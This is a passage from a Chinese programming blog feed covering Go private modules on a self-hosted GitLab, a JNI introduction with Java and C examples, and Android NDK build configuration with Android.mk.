<span class="token keyword">func</span> <span class="token function">MyShow</span><span class="token punctuation">(</span>param <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"the param is"</span><span class="token punctuation">,</span> param<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.1 my.go</strong></p>
<p>我们将代码 push 到本地 gitlab，然后打一个 tag，起名 v0.0.0。</p>
<p>接着写一个测试用的项目来引用这个 mod-test 模块，新建目录 use-mod，进入后执行 <code>go mod init use-mod</code>。接着我们使用命令 <code>go get gitlab.your-company.com/your-account/mod-test</code> 来安装依赖包，然后会翻车：</p>
<pre class="line-numbers language-none"><code class="language-none">go get: unrecognized import path &quot;gitlab.your-company.com&#x2F;your-account&#x2F;mod-test&quot;: parse https:&#x2F;&#x2F;gitlab.your-company.com&#x2F;your-account&#x2F;mod-test?go-get&#x3D;1: no go-import meta tags (meta tag gitlab.your-company.com:1234&#x2F;your-account&#x2F;mod-test did not match import path gitlab.your-company.com&#x2F;your-account&#x2F;mod-test)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>顺蔓摸瓜 ，<code>curl  https://gitlab.your-company.com/your-account/mod-test?go-get=1</code> 会发现他有如下输出：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>go-import<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gitlab.your-company.com:1234/your-account/mod-test git http://gitlab.your-company.com:1234/your-account/mod-test.git<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>究其原因应该是由于我们公司的 gitlab 搭建在 docker 中，内部端口开启的是 1234，然后内置一个 nginx 做反向代理，nginx 对外开放 80 和 443。</p>
<p>如果你使用的内网 gitlab 没有这种幺蛾子，刚才的操作就已经成功了。如果你非要在这种模式下使用，也不是没有办法，只不过步骤会复杂些。首先我们手动编辑 use-mod 项目中的 go.mod:</p>
<pre class="line-numbers language-none"><code class="language-none">module use-mod

go 1.17

require gitlab.your-company.com&#x2F;your-account&#x2F;mod-test v0.0.0

replace gitlab.your-company.com&#x2F;your-account&#x2F;mod-test v0.0.0 &#x3D;&gt; gitlab.your-company.com&#x2F;your-account&#x2F;mod-test.git v0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 2.2</strong></p>
<p>然后编写我们的 go 代码</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"gitlab.your-company.com/your-account/mod-test"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 2.3</strong></p>
<p>执行 <code>go mod tidy</code> 发现依赖包终于可以正常下载了，不过执行 <code>go run test.go</code> 又报错了：</p>
<pre class="line-numbers language-none"><code class="language-none">test.go:5:2: import &quot;gitlab.your-company.com&#x2F;your-account&#x2F;mod-test&quot; is a program, not an importable package<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们不能 import 一个 module 中 main 包中的代码，需要修改项目 mod-test，新建一个文件夹 my，把 <strong>代码 2.1</strong> 移动到 my 文件夹，然后修改第一行为 <code>package my</code>。</p>
<p>重新对项目 mod-test 打 tag ，tag 名字为 <code>v0.0.1</code>，然后修改 <strong>代码 2.2</strong> ，将里面的版本号相应的改为 <code>v0.0.1</code>。</p>
<p>修改 <strong>代码 2.3</strong> 改为如下：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"gitlab.your-company.com/your-account/mod-test/my"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	my<span class="token punctuation">.</span><span class="token function">MyShow</span><span class="token punctuation">(</span><span class="token string">"bcd"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.4</strong></p>
<p>执行 go mod tidy 来安装依赖包，然后执行 go build 就能正常生成的可执行程序。</p>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>通过 <strong>代码 1.0</strong> 设置完 GO_PRIVATE 环境变量之后，go 在下载前缀符合 GO_PRIVATE 值的 module 的时候，会尝试请求地址 <a href="https://gitlab.your-company.com/your-account/your-mod-name?go-get=1">https://gitlab.your-company.com/your-account/your-mod-name?go-get=1</a> ，正常情况下会返回如下格式</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>go-import<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gitlab.your-company.com/your-account/your-mod-name git http://gitlab.your-company.com/your-account/your-mod-name.git<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>代码 3.0</strong></p>
<p>返回的<strong>代码 3.0</strong> 中，如果域名后面没有跟端口号，是比较简单的，调用者直接使用 <code>go get gitlab.your-company.com/your-account/your-mod-name</code> 进行安装就行。但如果含有端口号，则需要手动编辑调用项目的 go.mod 文件，保证有如下 <strong>代码 3.1</strong> 配置，然后通过 go mod download 或者 go mod tidy 安装（后者需要起码在代码中有一处 import 该私有 module 中包的声明）</p>
<pre class="line-numbers language-none"><code class="language-none"># 这里假设你使用的版本号为v0.0.0
require gitlab.your-company.com&#x2F;your-account&#x2F;your-mod-name v0.0.0

replace gitlab.your-company.com&#x2F;your-account&#x2F;your-mod-name v0.0.0 &#x3D;&gt; gitlab.your-company.com&#x2F;your-account&#x2F;your-mod-name.git v0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 3.1</strong></p>
<p>由于在 <strong>代码 3.0</strong> 中指示了 go 要使用 git 方式下载代码，所以要正确的使用 <strong>代码 1.1</strong> 或者 <strong>代码1.2</strong> 做配置，保证 go 能过正常和 git 服务器做通信。</p>
<p>最后需要留意的是，你的调用某一个 module 时，只能调用其非 main 包中的代码。</p>
<blockquote>
<p>初学者还容易搞混的一个概念，就是 go 中的 module 和 package 的概念，使用 go get 下载的单元为一个 module，在代码中调用的时候，是调用 module 中的某一个 package。换句话说，就是一个 module 可以包含多一个 package （每个 package 的代码放置在同一个文件夹中）。 </p>
</blockquote>
<h2 id="4-其他问题"><a href="#4-其他问题" class="headerlink" title="4. 其他问题"></a>4. 其他问题</h2><p>如果在下载私有 module 的时候，出现如下问题：</p>
<pre class="line-numbers language-none"><code class="language-none">go mod download: gitlab.your-company.com&#x2F;your-account&#x2F;mod-test.git@v0.0.3: invalid version: git ls-remote -q origin in &#x2F;root&#x2F;go&#x2F;pkg&#x2F;mod&#x2F;cache&#x2F;vcs&#x2F;49e4f4ef52d3227f1c09bb8a8db5321ccf5cd277662d5a9ad607ffd2ff57b32d: exit status 128:
        fatal: unable to connect to gitlab.17zuoye.net:
        gitlab.your-company.com[0: 192.168.1.10]: errno&#x3D;Connection refused<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>通过提示信息上来看是版本号找不到，但是真实的原因可能并不如此。需要做两方面的检查，一方面确认 git 仓库上是否有 <code>v0.0.3</code> 这个 tag；另一方面也需要确认当前系统中配置的 ssh 私钥（<strong>代码 1.3</strong> 中的配置）是否有访问 mod-test 这个项目的权限，如果没有权限，同样会报 <code>invalid version</code> 这个错误。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>JNI系列教程一——入门</title>
    <url>/posts/jni/</url>
    <content><![CDATA[<h2 id="1-1-背景"><a href="#1-1-背景" class="headerlink" title="1.1 背景"></a>1.1 背景</h2><p>和很多语言类似，java也提供了调用原生代码的功能，这门技术叫做JNI。有了JNI，可以在付出更小的代价的前提下，复用大量已经写好的C&#x2F;C++库，当然一般用JNI的目的还是由于java在处理<strong>计算密集型</strong>（比如说非对称运算）的操作时有时会力不从心。<br>从结构上来看JNI是一个中间层，具体的调用步骤是这个样子的：java-&gt;JNI-&gt;C&#x2F;C++。  </p>
<blockquote>
<p>本文源地址<a href="http://blog.whyun.com/posts/jni">http://blog.whyun.com/posts/jni</a> 转载请注明出处</p>
</blockquote>
<h2 id="1-2-准备活动"><a href="#1-2-准备活动" class="headerlink" title="1.2 准备活动"></a>1.2 准备活动</h2><h3 id="1-2-1-编写java代码"><a href="#1-2-1-编写java代码" class="headerlink" title="1.2.1 编写java代码"></a>1.2.1 编写java代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>whyun<span class="token punctuation">.</span>jni<span class="token punctuation">.</span>chapter1</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * User: sunny
 * Date: 15-10-28
 * Time: 下午12:29
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FirstDemo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"firstdemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">getNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token class-name">String</span> <span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">FirstDemo</span> demo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FirstDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"num:"</span><span class="token operator">+</span>demo<span class="token punctuation">.</span><span class="token function">getNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",string:"</span><span class="token operator">+</span>demo<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 1.2.1.1</strong><br>注意到我们在类<code>FirstDemo</code>中定义了两个成员函数都没有函数体，且都加了关键字<code>native</code>声明，如果函数写成这样，则代表当前函数需要调用底层C&#x2F;C++代码。注意<code>System.loadLibrary</code>这句话，java中使用这个函数来加载动态库，windows平台下运行此段代码要保证<code>firstdemo.dll</code>存在环境变量<code>%path%</code>中，linux平台下要保证<code>libfirstdemo.so</code>存在环境变量<code>$LD_LIBRARY_PATH</code>中。</p>
<blockquote>
<p>其实java在<code>loadLibrary</code>的时候，是读取的系统变量<code>java.library.path</code>来搜寻动态库位置的，你可以用<code>System.getProperty(&quot;java.library.path&quot;)</code>来输出这个变量的内容。只不过在windows中会把环境变量<code>%path%</code>的内容加入到这个变量中，在linux中会把环境变量<code>$LD_LIBRARY_PATH</code>加入到这个变量中。在我的一台linux上打印<code>java.library.path</code>，会输入如下内容：<br><code>/usr/jdk1.6.0_45/jre/lib/i386/server:/usr/jdk1.6.0_45/jre/lib/i386: /usr/jdk1.6.0_45/jre/../lib/i386: /home/username/lib::/usr/java/packages/lib/i386 :/lib:/usr/lib</code><br>其中<code>/home/username/lib:</code>是从环境变量<code>$LD_LIBRARY_PATH</code>读取的。不推荐将生成的动态库放置到系统目录中，首先是不一定有管理员权限，其次会导致系统库目录下的文件过多，不易管理。</p>
</blockquote>
<h3 id="1-2-2-生成头文件"><a href="#1-2-2-生成头文件" class="headerlink" title="1.2.2 生成头文件"></a>1.2.2 生成头文件</h3><p>本文用到的项目源码在文后给出，项目的目录结构如下：<br><img src="http://blog.whyun.com/images/chapter1_dir.jpg" alt="项目目录结构"><br><strong>图1.2.2 项目目录结构</strong><br>其中目录<code>out/production</code>为我们的class文件生成的目录，在命令行下进入该目录，运行如下命令<code>javah com.whyun.jni.chapter1.FirstDemo</code>，运行成功之后则在运行命令行的目录下生成文件<code>com_whyun_jni_chapter1_FirstDemo.h</code>,用文本编辑器打开这个头文件，会显示如下内容：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span>
<span class="token comment">/* Header for class com_whyun_jni_chapter1_FirstDemo */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_Included_com_whyun_jni_chapter1_FirstDemo</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_Included_com_whyun_jni_chapter1_FirstDemo</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">&#123;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token comment">/*
 * Class:     com_whyun_jni_chapter1_FirstDemo
 * Method:    getNum
 * Signature: ()I
 */</span>
JNIEXPORT jint JNICALL <span class="token function">Java_com_whyun_jni_chapter1_FirstDemo_getNum</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span><span class="token punctuation">,</span> jobject<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * Class:     com_whyun_jni_chapter1_FirstDemo
 * Method:    getString
 * Signature: ()Ljava/lang/String;
 */</span>
JNIEXPORT jstring JNICALL <span class="token function">Java_com_whyun_jni_chapter1_FirstDemo_getString</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span><span class="token punctuation">,</span> jobject<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span>
<span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 1.2.1</strong></p>
<h2 id="1-3-编译运行"><a href="#1-3-编译运行" class="headerlink" title="1.3 编译运行"></a>1.3 编译运行</h2><p>为了简化在windows和linux下配置编译步骤，我们先在操作系统中配置两个环境变量，在windows上将<code>JAVA_HOME</code>配置为JDK的安装路径，很多情况下这个环境变量在配置JDK编译环境的时候已经配置过，可以通过<code>echo %JAVA_HOME%</code>的输出来判断之前是否已经配置过；同理我们在linux上也配置环境变量<code>JAVA_HOME</code>(通过运行<code>echo $JAVA_HOME</code>来检测是否存在)。同时我们在windows上将目录<code>d:\lib</code>加入环境变量<code>PATH</code>中，在linux上将<code>/opt/lib</code>加入环境变量<code>LD_LIBRARY_PATH</code>中。</p>
<h3 id="1-3-1-windows编译环境配置"><a href="#1-3-1-windows编译环境配置" class="headerlink" title="1.3.1 windows编译环境配置"></a>1.3.1 windows编译环境配置</h3><p>windows下需要安装visual studio（简称vs）环境来完成C&#x2F;C++编译，vs 有professional、ultimate和Express三个版本，前两者收费，我们使用免费的Express就够用了。我电脑上装的是vs express for desktop版本。<br>打开vs，新建项目，选择Visual C++，然后选择Empty Project，输入项目名<code>firstdemo</code>,点击确定。<br>接着设置项目属性，右击项目，然后选择properties，在Configuration Properties-&gt;General-&gt;Project Defaults-&gt;Configuration Type中，选择<code>Dynamic Library (.dll)</code>。然后在Configuration Properties-&gt;VC++ Directories-&gt;General-&gt;Include Directories中添加两个路径：<code>$(JAVA_HOME)\include</code>和<code>$(JAVA_HOME)\include\win32</code>。<br>最后编写c代码，在vs中新建源代码的时候，默认是cpp后缀，我们这里建一个c后缀的文件，因为我的编写习惯是c语法。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"com_whyun_jni_chapter1_FirstDemo.h"</span></span>

<span class="token comment">/*
 * Class:     com_whyun_jni_chapter1_FirstDemo
 * Method:    getNum
 * Signature: ()I
 */</span>
JNIEXPORT jint JNICALL <span class="token function">Java_com_whyun_jni_chapter1_FirstDemo_getNum</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	  <span class="token keyword">return</span> <span class="token punctuation">(</span>jint<span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
 * Class:     com_whyun_jni_chapter1_FirstDemo
 * Method:    getString
 * Signature: ()Ljava/lang/String;
 */</span>
JNIEXPORT jstring JNICALL <span class="token function">Java_com_whyun_jni_chapter1_FirstDemo_getString</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject ob<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	  jstring jinfo			<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewStringUTF</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span><span class="token string">"the first demo."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	  <span class="token keyword">return</span> jinfo<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码1.3.1 firstdemo.c</strong><br>注意我们引用了之前的<code>com_whyun_jni_chapter1_FirstDemo.h</code>，我们把它放到<code>firstdemo.c</code>同一级目录下了。<br>接着运行编译，产生dll文件，默认情况下会在项目目录Debug文件夹下产生firstdeom.dll，你可以把这个文件夹添加到环境变量PATH中去，也可以写脚本在编译完成之后将dll拷贝到电脑的任何一个PATH路径下，在Configuration Properties-&gt;Build Events-&gt;Post-Build Event-&gt;Command Line中写入如下命令：<code>copy &quot;$(TargetDir)$(TargetName).dll&quot; d:\lib\$(TargetName).dll</code>。</p>
<h3 id="1-3-2-linux编译"><a href="#1-3-2-linux编译" class="headerlink" title="1.3.2 linux编译"></a>1.3.2 linux编译</h3><p>在linux下使用命令行GCC即可，将<code>com_whyun_jni_chapter1_FirstDemo.h</code>和<code>firstdemo.c</code>放到同一个目录下，然后运行脚本</p>
<pre class="line-numbers language-none"><code class="language-none">saveDir&#x3D;&#x2F;opt&#x2F;lib
gcc -g -Wall -I $JAVA_HOME&#x2F;include&#x2F; -I $JAVA_HOME&#x2F;include&#x2F;linux -fPIC -shared -o $saveDir&#x2F;libfirstdemo.so firstdemo.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="1-3-3-运行"><a href="#1-3-3-运行" class="headerlink" title="1.3.3 运行"></a>1.3.3 运行</h3><p>运行java代码，最终输出</p>
<pre><code>num:1,string:the first demo.
</code></pre>
<blockquote>
<p>本文用到的源代码可以从<a href="https://gitlab.com/yunnysunny/jni">https://gitlab.com/yunnysunny/jni</a> 获得到</p>
</blockquote>
]]></content>
      <categories>
        <category>Java</category>
        <category>JNI</category>
      </categories>
  </entry>
  <entry>
    <title>JNI系列教程三 —— NDK入门</title>
    <url>/posts/jni-ndk/</url>
    <content><![CDATA[<h2 id="3-1-背景"><a href="#3-1-背景" class="headerlink" title="3.1 背景"></a>3.1 背景</h2><p>谈到JNI的使用场景，最常用的就是android NDK的编写了。首先从<a href="http://developer.android.com/ndk/downloads/index.html#download">http://developer.android.com/ndk/downloads/index.html#download</a> 把最新版的NDK下载下来。下载完之后得到一个exe文件，这其实是一个自解压文件，运行后自动解压，解压完成后的文件夹有3GB，所以你的磁盘空间起码得留足5GB左右的剩余空间。<br>最终我们得到这么一个目录结构：</p>
<p><img src="/images/ndk_dir.jpg" alt="ndk目录结构"><br><strong>图3.1.1 ndk目录结构</strong><br>接着需要将ndk所在目录添加到环境变量PATH中，这样在以后运行的时候，只需要输出<code>ndk-buld</code>就可以了。文件夹<code>plantforms</code>存放着编译各个版本的android所需的头文件和动态库，举个例子<code>platforms/android-3/arch-arm</code>文件夹下存放的是<code>android 1.5</code>版本的<code>arm</code>平台的头文件和库文件，从<code>android 2.3</code>开始，开始支持<code>x86</code>和<code>mips</code>两个平台，所以在<code>platforms/android-9</code>目录下会有<code>arch-arm</code> <code>arch-mips</code> <code>arch-x86</code>三个文件夹。</p>
<blockquote>
<p>本文源地址：<a href="http://blog.whyun.com/posts/jni-ndk/">http://blog.whyun.com/posts/jni-ndk/</a> 转载请注明出处。</p>
</blockquote>
<h2 id="3-2-Android-mk"><a href="#3-2-Android-mk" class="headerlink" title="3.2 Android.mk"></a>3.2 Android.mk</h2><p>mk后缀的文件是makefile文件，mk文件一般通过<code>include</code>语法被引入到其它makefile中。在NDK中Android.mk里存储的都是编译相关的配置信息，我们先举一个例子：</p>
<pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH :&#x3D; $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE :&#x3D; chapter3
LOCAL_CFLAGS :&#x3D; -DJNI_ANDROID
LOCAL_LDLIBS :&#x3D; -llog -lm
TARGET_ARCH :&#x3D; arm
TARGET_PLATFORM :&#x3D; android-7
LOCAL_SRC_FILES :&#x3D; chapter3.c 

$(info $(SYSROOT))
include $(BUILD_SHARED_LIBRARY)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件第一行中<code>my-dir</code>是一个函数，通过调用它返回当前路径，<code>CLEAR_VARS</code>变量指向一个mk文件，它会清除所有除了<code>LOCAL_PATH</code>之外的<code>LOCAL_</code>开头的变量，下面是一些列的对于<code>LOCAL_</code>开头的变量的定义：</p>
<ul>
<li>LOCAL_MODULE 定义当前生成模板的名称，注意到文件最后一行<code>include $(BUILD_SHARED_LIBRARY)</code>代表当前是要生成一个动态库，所以说将LOCAL_MODULE定义成<code>chapter3</code>后，将会得到一个<code>libchapter3.so</code>文件。</li>
<li>LOCAL_CFLAGS 定义编译用到的宏定义，当然也可以使用<code>-I</code>来指定头文件路径，不过这个使用<code>LOCAL_C_INCLUDES</code>更适合，因为后者可以被断点调试程序gdb识别。</li>
<li>TARGET_PLATFORM 指定当前使用的API版本，比如说android-9，就会使用NDK文件夹下的<code>platforms/android-9</code>中的头文件和库来参与编译（对于API版本和android版本之间的对应关系，可以参见百度百科的词条<a href="http://baike.baidu.com/view/7902337.htm">Android历史版本</a>）。</li>
<li>TARGET_ARCH 指定编译的CPU平台，不同API版本支持的类型不同，越新的API支持的CPU平台就越多，如果想查看当前API版本支持哪几个平台，去<code>plantforms/android-&#123;API版本号&#125;</code>中看一下便知道，比如说android-3仅仅支持一个平台<code>arch-arm</code>:<br><img src="/images/1.5arch.png" alt="1.5支持的cpu类型"></li>
</ul>
<p><strong>图3.2.1 anroid 1.5支持的cpu类型</strong><br>那么android-3，可选的<code>TARGET_ARCH</code>就只有一个<code>arm</code>选项。<br>但是<code>android-21</code>就支持6个CPU平台：<br><img src="/images/anroid21-arch.png" alt="android-21支持的CPU类型"><br><strong>图3.2.2 android5.0 支持的CPU类型</strong><br>这样对于android5.0来说可选的选项包括<code>arm</code> <code>arm64</code> <code>mips</code> <code>mips64</code> <code>x86</code> <code>x86_64</code><br>另外如果没有指定这个值的话，就会用默认的<code>arm</code></p>
<ul>
<li>LOCAL_LDLIBS 指定要引用的系统库，比如例子中的<code>-llog</code>就会引用&#96;&#96;plantforms&#x2F;android-{API版本号}&#x2F;usr&#x2F;lib&#x2F;liblog.so&#96;。</li>
<li>LOCAL_SRC_FILES 在这里就是要编译的c文件了，如果一行写不开，需要写多行，那么可以在每行的行尾加上 <code> \</code>。</li>
<li>BUILD_SHARED_LIBRARY 这里代表最终生成的是一个动态库文件。</li>
</ul>
<h2 id="3-3-简单例子"><a href="#3-3-简单例子" class="headerlink" title="3.3 简单例子"></a>3.3 简单例子</h2><p>这个例子就是NDK<code>samples</code>目录中<code>hello-jni</code>项目，将这个项目随便拷贝到某一个目录，然后删除掉项目中的tests文件夹，这个是一个单元测试，我不知道怎么使用它，所以直接删除掉。然后打开eclipse，选择File-&gt;Project…-&gt;Android-&gt;Android Project From Existing Code,选择刚才拷贝后的路径，点击完成。<br>在命令行中进入项目的jni文件夹，然后运行<code>ndk-build</code>，你会发现程序生成了好几个so文件夹，放置于项目的<code>libs</code>文件夹中，这是由于在文件<code>Application.mk</code>（位于文件夹<code>jni</code>中）文件中这一句造成的：<br><code>APP_ABI := all</code><br><code>ABI</code>这个参数（可以参见百度百科词条<a href="http://baike.baidu.com/subview/1433570/6276632.htm">ABI</a>）比之前讲到的<code>ARCH</code>要更加细化，可以理解为在同一体系结构下CPU的不同版本，支持的指令集有所差异，android中支持的ABI可以参见<a href="http://developer.android.com/ndk/guides/abis.html">谷歌官方ABI解释</a>。最终在模拟器上运行程序成功：  </p>
<p><img src="/images/hello_jni_run_success.png" alt="运行hello-jni项目成功"><br><strong>图3.3 运行hello-jni项目成功</strong>  </p>
]]></content>
      <categories>
        <category>Java</category>
        <category>JNI</category>
      </categories>
  </entry>
  <entry>
    <title>JNI系列教程之四——在NDK中使用第三方库</title>
    <url>/posts/jni/use-thrid-part-library-in-ndk/</url>
    <content><![CDATA[<h2 id="4-1-背景"><a href="#4-1-背景" class="headerlink" title="4.1 背景"></a>4.1 背景</h2><p>既然使用NDK，一般两个常见的原因，一个就是java代码运行效率低，还有一个就是之前和c相关的类库已经在其它项目中准备好了，这样使用NDK就可以尽可能的复用代码。</p>
<blockquote>
<p>本文源地址：<a href="http://blog.whyun.com/posts/jni/use-thrid-part-library-in-ndk/">http://blog.whyun.com/posts/jni/use-thrid-part-library-in-ndk/</a> 转载请注明出处。</p>
</blockquote>
